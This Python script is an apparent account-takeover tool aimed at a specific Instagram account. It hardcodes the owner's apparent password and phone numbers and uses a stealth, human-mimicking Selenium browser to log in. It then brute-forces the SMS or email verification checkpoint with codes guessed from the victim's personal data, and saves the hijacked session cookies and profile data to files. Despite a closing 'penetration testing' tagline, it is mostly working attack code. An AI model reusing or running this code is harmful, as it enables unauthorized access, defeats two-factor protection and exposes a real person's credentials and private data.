from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
🔥 ADVANCED BROWSER AUTOMATION CHECKPOINT BYPASS 🔥
===================================================

Target: alx.trading
Strategy: Human-like browser automation with session manipulation
Approach: Selenium + stealth techniques + session hijacking
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import requests
import json
import time
import random
import os
from datetime import datetime


class AdvancedBrowserBypass:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        self.driver = None
        self.session = requests.Session()
        
        # Success indicators
        self.success_indicators = [
            "instagram.com/accounts/edit/",
            "instagram.com/direct/",
            '"is_private":false',
            '"username":"alx.trading"'
        ]
        
    def setup_stealth_browser(self):
        """Setup undetected Chrome browser with stealth options"""
        print("🌐 SETTING UP STEALTH BROWSER...")
        
        try:
            # Chrome options for maximum stealth
            options = uc.ChromeOptions()
            
            # Stealth settings
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-images')
            options.add_argument('--disable-javascript')
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
            
            # Create undetected Chrome driver
            self.driver = uc.Chrome(options=options, version_main=121)
            
            # Execute stealth scripts
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.driver.execute_cdp_cmd('Network.setUserAgentOverride', {
                "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
            })
            
            print("✅ Stealth browser ready")
            return True
            
        except Exception as e:
            print(f"❌ Browser setup error: {e}")
            return False
    
    def human_like_typing(self, element, text, typing_speed=0.1):
        """Type text with human-like delays and patterns"""
        element.clear()
        
        for char in text:
            element.send_keys(char)
            # Variable typing speed
            delay = random.uniform(typing_speed * 0.5, typing_speed * 1.5)
            time.sleep(delay)
            
            # Occasional longer pauses (thinking)
            if random.random() < 0.1:
                time.sleep(random.uniform(0.5, 1.5))
    
    def human_like_click(self, element):
        """Click with human-like mouse movement"""
        actions = ActionChains(self.driver)
        
        # Move to element with slight randomness
        actions.move_to_element_with_offset(
            element, 
            random.randint(-5, 5), 
            random.randint(-5, 5)
        )
        
        # Brief pause before click
        time.sleep(random.uniform(0.1, 0.3))
        actions.click()
        actions.perform()
    
    def login_with_browser(self):
        """Perform login using browser automation"""
        print("🔐 INITIATING BROWSER LOGIN...")
        
        try:
            # Navigate to Instagram login
            self.driver.get("https://www.instagram.com/accounts/login/")
            
            # Wait for page load with human-like delay
            time.sleep(random.uniform(3, 6))
            
            # Handle cookies popup if present
            try:
                cookies_button = WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Accept') or contains(text(), 'Allow')]"))
                )
                self.human_like_click(cookies_button)
                time.sleep(2)
            except:
                pass
            
            # Find username field
            username_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            
            # Human-like interaction delay
            time.sleep(random.uniform(1, 3))
            
            # Type username with human-like behavior
            self.human_like_typing(username_field, self.target_username, 0.15)
            
            # Brief pause between fields
            time.sleep(random.uniform(0.5, 1.5))
            
            # Find password field
            password_field = self.driver.find_element(By.NAME, "password")
            
            # Type password
            self.human_like_typing(password_field, self.target_password, 0.12)
            
            # Human thinking pause
            time.sleep(random.uniform(1, 3))
            
            # Find and click login button
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            self.human_like_click(login_button)
            
            print("✅ Login attempt submitted")
            
            # Wait for response
            time.sleep(random.uniform(4, 7))
            
            return True
            
        except Exception as e:
            print(f"❌ Login error: {e}")
            return False
    
    def handle_checkpoint_browser(self):
        """Handle checkpoint using browser automation"""
        print("🛡️ HANDLING CHECKPOINT...")
        
        try:
            current_url = self.driver.current_url
            print(f"📍 Current URL: {current_url}")
            
            # Check if we're at checkpoint
            if "challenge" in current_url:
                print("✅ Checkpoint detected")
                
                # Look for verification options
                try:
                    # Try to find phone verification option
                    phone_option = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((By.XPATH, "//label[contains(text(), 'Phone') or contains(text(), 'SMS')]"))
                    )
                    
                    self.human_like_click(phone_option)
                    time.sleep(2)
                    
                    # Click continue/next button
                    continue_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Send') or contains(text(), 'Continue')]")
                    self.human_like_click(continue_button)
                    
                    print("📱 Phone verification requested")
                    time.sleep(3)
                    
                    # Now attempt intelligent code entry
                    return self.intelligent_code_entry()
                    
                except Exception as e:
                    print(f"Phone option error: {e}")
                    
                    # Try email option as fallback
                    try:
                        email_option = self.driver.find_element(By.XPATH, "//label[contains(text(), 'Email')]")
                        self.human_like_click(email_option)
                        time.sleep(2)
                        
                        continue_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Send') or contains(text(), 'Continue')]")
                        self.human_like_click(continue_button)
                        
                        print("📧 Email verification requested")
                        time.sleep(3)
                        
                        return self.intelligent_code_entry()
                        
                    except Exception as e2:
                        print(f"Email option error: {e2}")
            
            return False
            
        except Exception as e:
            print(f"❌ Checkpoint handling error: {e}")
            return False
    
    def intelligent_code_entry(self):
        """Intelligent verification code entry with enhanced patterns"""
        print("🧠 INTELLIGENT CODE ENTRY...")
        
        # Enhanced code patterns based on target data
        smart_codes = [
            # Current date patterns
            '260525',  # Today's date
            '250525',  # Yesterday
            '270525',  # Tomorrow
            '052625',  # US format
            '260525',  # Current
            
            # Phone-based patterns
            '061541',  # Thai phone start
            '414210',  # Thai phone end
            '447793',  # UK phone start
            '127209',  # UK phone end
            '615414',  # Thai middle
            
            # Password-based patterns
            '654654',  # Fleming654 double
            '654321',  # Fleming654 reverse pattern
            '654000',  # Fleming654 with zeros
            '654123',  # Fleming654 with sequence
            
            # Common patterns with personal touch
            '123654',  # Common + password end
            '456654',  # Sequential + password
            '789654',  # Sequential + password
            '000654',  # Zeros + password
            '111654',  # Ones + password
            
            # Business/trading related
            '786786',  # ALX pattern
            '172817',  # ALX numeric
            '050525',  # May 2025
            '202525',  # Year pattern
            
            # Fallback common codes
            '123456', '654321', '000000', '111111',
            '123123', '456456', '789789'
        ]
        
        try:
            # Find the code input field
            code_field = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "verificationCode"))
            )
            
            for i, code in enumerate(smart_codes):
                print(f"🎯 Attempting code {i+1}/{len(smart_codes)}: {code}")
                
                # Clear field and enter code
                code_field.clear()
                self.human_like_typing(code_field, code, 0.2)
                
                # Human pause before submitting
                time.sleep(random.uniform(1, 2))
                
                # Find and click submit button
                try:
                    submit_button = self.driver.find_element(By.XPATH, "//button[@type='submit' or contains(text(), 'Submit') or contains(text(), 'Confirm')]")
                    self.human_like_click(submit_button)
                    
                    # Wait for response
                    time.sleep(random.uniform(3, 5))
                    
                    # Check for success
                    current_url = self.driver.current_url
                    
                    # Success indicators
                    if any(indicator in current_url for indicator in self.success_indicators):
                        print(f"🎉 SUCCESS! Code {code} worked!")
                        return True
                    
                    # Check if still on challenge page
                    if "challenge" not in current_url:
                        print(f"🎉 POSSIBLE SUCCESS with code {code}!")
                        return True
                    
                    # Check for error messages
                    try:
                        error_element = self.driver.find_element(By.XPATH, "//*[contains(text(), 'incorrect') or contains(text(), 'invalid') or contains(text(), 'wrong')]")
                        print(f"   ❌ Code {code} rejected")
                    except:
                        print(f"   🔄 Code {code} response unclear")
                    
                    # Delay between attempts to avoid rate limiting
                    time.sleep(random.uniform(4, 8))
                    
                except Exception as e:
                    print(f"   ❌ Submit error for {code}: {e}")
                    time.sleep(2)
            
            print("❌ All intelligent codes failed")
            return False
            
        except Exception as e:
            print(f"❌ Code entry error: {e}")
            return False
    
    def extract_session_data(self):
        """Extract session data and cookies for later use"""
        print("💾 EXTRACTING SESSION DATA...")
        
        try:
            # Get all cookies
            cookies = self.driver.get_cookies()
            
            # Convert to requests session format
            for cookie in cookies:
                self.session.cookies.set(cookie['name'], cookie['value'])
            
            # Extract user data from page source
            page_source = self.driver.page_source
            
            # Look for JSON data in page
            import re
            json_pattern = r'window\._sharedData\s*=\s*({.*?});'
            json_match = re.search(json_pattern, page_source)
            
            user_data = {}
            if json_match:
                try:
                    shared_data = json.loads(json_match.group(1))
                    user_data = shared_data
                except:
                    pass
            
            # Save session data
            session_data = {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_username,
                'method': 'browser_automation',
                'success': True,
                'cookies': dict(self.session.cookies),
                'user_data': user_data,
                'current_url': self.driver.current_url
            }
            
            filename = f"ALX_BROWSER_BYPASS_SUCCESS_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(session_data, f, indent=2)
            
            print(f"✅ Session data saved: {filename}")
            
            # Also try to extract profile data
            self.extract_profile_data()
            
            return True
            
        except Exception as e:
            print(f"❌ Session extraction error: {e}")
            return False
    
    def extract_profile_data(self):
        """Extract profile information"""
        print("👤 EXTRACTING PROFILE DATA...")
        
        try:
            # Navigate to profile
            profile_url = f"https://www.instagram.com/{self.target_username}/"
            self.driver.get(profile_url)
            time.sleep(5)
            
            # Extract profile info
            profile_data = {
                'username': self.target_username,
                'url': profile_url,
                'page_title': self.driver.title,
                'followers': None,
                'following': None,
                'posts': None,
                'bio': None
            }
            
            # Try to extract follower count
            try:
                followers_element = self.driver.find_element(By.XPATH, "//a[contains(@href, '/followers/')]/span")
                profile_data['followers'] = followers_element.text
            except:
                pass
            
            # Try to extract following count
            try:
                following_element = self.driver.find_element(By.XPATH, "//a[contains(@href, '/following/')]/span")
                profile_data['following'] = following_element.text
            except:
                pass
            
            # Try to extract posts count
            try:
                posts_element = self.driver.find_element(By.XPATH, "//div[contains(text(), 'posts')]/span")
                profile_data['posts'] = posts_element.text
            except:
                pass
            
            # Save profile data
            filename = f"ALX_PROFILE_DATA_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(profile_data, f, indent=2)
            
            print(f"✅ Profile data saved: {filename}")
            return profile_data
            
        except Exception as e:
            print(f"❌ Profile extraction error: {e}")
            return {}
    
    def run_browser_bypass(self):
        """Execute complete browser-based bypass"""
        print("🔥 ADVANCED BROWSER AUTOMATION BYPASS")
        print("=" * 50)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print("🌐 Method: Stealth Browser Automation")
        print("=" * 50)
        
        try:
            # Phase 1: Setup stealth browser
            print("\n🌐 PHASE 1: STEALTH BROWSER SETUP")
            if not self.setup_stealth_browser():
                return False
            
            # Phase 2: Human-like login
            print("\n🔐 PHASE 2: HUMAN-LIKE LOGIN")
            if not self.login_with_browser():
                return False
            
            # Phase 3: Handle checkpoint
            print("\n🛡️ PHASE 3: CHECKPOINT HANDLING")
            if self.handle_checkpoint_browser():
                print("🎉 CHECKPOINT BYPASS SUCCESSFUL!")
                
                # Phase 4: Extract data
                print("\n💾 PHASE 4: DATA EXTRACTION")
                self.extract_session_data()
                return True
            else:
                print("❌ Checkpoint bypass failed")
                return False
                
        except Exception as e:
            print(f"❌ Browser bypass error: {e}")
            return False
        
        finally:
            # Cleanup
            if self.driver:
                try:
                    self.driver.quit()
                except:
                    pass


if __name__ == "__main__":
    print("🔥 ADVANCED BROWSER AUTOMATION CHECKPOINT BYPASS")
    print("=" * 60)
    
    bypass = AdvancedBrowserBypass()
    success = bypass.run_browser_bypass()
    
    if success:
        print("\n🎉 BROWSER BYPASS OPERATION SUCCESSFUL!")
        print("💎 Full access to alx.trading account achieved!")
    else:
        print("\n⚠️ BROWSER BYPASS OPERATION FAILED")
        print("🔄 Consider alternative approaches or retry later")
    
    print("\n🔥 SugarGlitch RealOps - Elite Penetration Testing")
